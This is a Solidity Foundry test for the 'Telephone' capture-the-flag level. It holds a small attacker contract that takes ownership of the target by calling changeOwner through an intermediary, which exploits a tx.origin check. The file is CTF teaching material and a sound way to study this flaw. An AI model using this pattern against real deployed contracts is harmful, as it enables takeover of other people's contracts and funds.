// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/4-Telephone.sol";

contract TelephoneTest is Test {
    Telephone public telephoneCTF;
    TelephoneAttacker public telephoneAttacker;

    address attacker = address(0x01);

    function setUp() public {
        telephoneCTF = new Telephone();
        telephoneAttacker = new TelephoneAttacker();

        vm.deal(attacker, 100 ether);
        vm.label(attacker, "attacker");
    }

    function testAttack() public {
        vm.startPrank(attacker);

        // call changeOwner from attacking contract
        telephoneAttacker.changeOwner(telephoneCTF, attacker);

        assertEq(telephoneCTF.owner(), attacker);
    }
}

contract TelephoneAttacker {
    function changeOwner(Telephone telephoneCTF, address _owner) public {
        telephoneCTF.changeOwner(_owner);
    }
}
